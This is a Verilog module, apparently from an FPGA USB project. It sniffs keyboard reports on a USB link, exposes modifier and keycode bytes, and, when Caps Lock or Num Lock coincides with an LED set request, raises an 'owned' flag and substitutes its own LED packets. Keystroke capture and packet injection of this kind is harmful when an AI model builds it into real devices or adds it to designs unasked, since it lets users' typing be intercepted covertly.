module Keyboard_sniffer(
	input clk, rst,
	
	input [63:0] data,
	input[2:0] usb_state,
	input[7:0] pid,
	input host_dir,
	
	output[7:0] modifier,
	output[7:0] keycode,
	output reg[3:0] leds,
	
	output owned,
	output [63:0] own_data,
	
	input led_ctrl,
	
	output[3:0] debug
);

wire[63:0] led_on = {25'b0100000001110101001010100, 39'b0};
wire[63:0] led_off = {25'b0010000000110101010101010, 39'b0};

assign own_data = led_ctrl ? led_on : led_off;
	
reg[63:0] keyboard_data;
reg[7:0] prev_pid;

assign modifier = keyboard_data[7:0];
assign keycode =  keyboard_data[23:16];

reg led_data;
reg caps_num_pressed;

assign owned = led_data && caps_num_pressed;

always@ (posedge clk) begin
	if(rst) begin
		led_data <= 0;
		leds <= 0;
		caps_num_pressed <= 0;
	end else begin
	
		if(usb_state == 4) begin
			prev_pid <= pid;
			
			if(pid == DATA0 || pid == DATA1) begin
				if(led_data) leds <= data[3:0];
				else if(prev_pid == IN_Token) begin
					keyboard_data <= data;
					if(data[23:16] == 8'h39 || data[23:16] == 8'h53) caps_num_pressed <= 1;
					else caps_num_pressed <= 0;
				end
			end
			
			if(pid == OUT_Token && data[10:7] == 4'b0) led_data <= 1;
			else led_data <= 0;
			
		end
	end
end

assign debug[0] = owned;
assign debug[1] = caps_num_pressed;
assign debug[2] = (prev_pid == IN_Token);
assign debug[3] = 1'b0;

endmodule
